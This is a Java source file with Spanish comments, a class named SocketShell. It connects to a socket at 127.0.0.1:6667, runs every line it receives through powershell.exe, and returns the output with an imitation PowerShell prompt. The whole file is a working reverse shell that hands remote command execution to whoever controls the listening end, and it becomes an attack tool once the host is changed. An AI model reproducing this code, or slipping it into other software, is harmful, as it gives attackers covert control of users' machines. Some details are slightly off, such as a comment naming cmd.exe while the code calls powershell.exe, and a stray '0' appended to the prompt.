package org.elijaxapps.libre8.telnet;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class SocketShell {

    public static void main(String[] args) {
        final String host = "127.0.0.1";
        final int port = 6667;

        Socket socket = null;
        BufferedReader in = null;
        PrintWriter out = null;
        Scanner scanner = null;

        try {
            socket = new Socket(host, port);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);
            scanner = new Scanner(System.in);

            System.out.println("Conectado a " + host + ":" + port);

            while (true) {
                String response = null;
                while (response == null || response.isEmpty()) {
                    response = in.readLine();
                    // Espera a que haya datos disponibles para leer
                    try {
                        Thread.sleep(100); // Espera un poco antes de volver a comprobar
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt(); // Restaurar el estado de interrupción
                        System.out.println("Interrupción del hilo.");
                        return;
                    }

                    if (response != null) {
                        //System.out.println("Respuesta del servidor: " + response);
                        // Use shell interpreter for commands like 'dir' on Windows
                        String command = response.trim();

                        ProcessBuilder pb = new ProcessBuilder();
                        pb.redirectErrorStream(true); // Combina la salida de error con la salida estándar
                        pb.command("powershell.exe", "/c", command); // Use cmd.exe to execute the command
                        Process p = pb.start();
                        out.print("@"); // Send a byte to indicate the command was received");
                        try (BufferedReader processOutput = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                            String line;
                            while ((line = processOutput.readLine()) != null) {
                                System.out.println(line);
                                out.print(line + "\n");
                            }

                            //Print Windows prompt
                            out.print("PS " + System.getProperty("user.dir") + "> "+0x00);
                            out.flush();
                        }
                        p.destroy();
                    
                    } else {
                        System.out.println("Conexión cerrada por el servidor.");
                        break;
                    }
                }
            }

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                if (scanner != null) {
                    scanner.close();
            
                }} catch (Exception ignored) {
            }
            try {
                if (in != null) {
                    in.close();
            
                }} catch (Exception ignored) {
            }
            try {
                if (out != null) {
                    out.close();
            
                }} catch (Exception ignored) {
            }
            try {
                if (socket != null) {
                    socket.close();
            
                }} catch (Exception ignored) {
            }
        }
    }
}
